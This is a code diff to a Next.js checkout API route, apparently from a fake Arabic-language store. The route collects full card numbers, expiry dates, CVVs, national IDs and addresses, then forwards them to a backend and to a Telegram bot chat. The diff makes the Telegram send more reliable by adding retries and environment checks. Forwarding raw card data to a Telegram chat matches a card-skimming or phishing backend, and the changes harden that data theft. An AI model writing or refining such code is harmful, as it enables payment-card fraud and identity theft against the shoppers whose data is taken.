@@ -1,18 +1,31 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
+  const body = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;
+
+  // Validation
+  if (!cardNumber || !expiry || !cvv || !cardHolder || !items?.length || !total) {
+    return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
+  }
+
+  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID || !process.env.BACKEND_URL) {
+    console.error("Missing env: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, or BACKEND_URL");
+    return NextResponse.json({ ok: false, error: "خطأ في إعدادات الخادم" }, { status: 500 });
+  }
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
+  let dbSaved = false;
   try {
-    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
+    dbSaved = dbRes.ok;
   } catch {}
 
   // Send Telegram
@@ -44,16 +57,27 @@ export async function POST(req: NextRequest) {
     ],
   };
 
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
-      }
-    );
-  } catch {}
+  let telegramSent = false;
+  const MAX_RETRIES = 3;
+  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
+    try {
+      const tgRes = await fetch(
+        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
+        }
+      );
+      if (tgRes.ok) { telegramSent = true; break; }
+    } catch {}
+    // Wait before retry
+    if (attempt < MAX_RETRIES - 1) await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
+  }
 
-  return NextResponse.json({ ok: true, orderId });
+  if (!telegramSent && !dbSaved) {
+    return NextResponse.json({ ok: false, error: "فشل في حفظ الطلب" }, { status: 500 });
+  }
+
+  return NextResponse.json({ ok: true, orderId, telegramSent, dbSaved });
 }
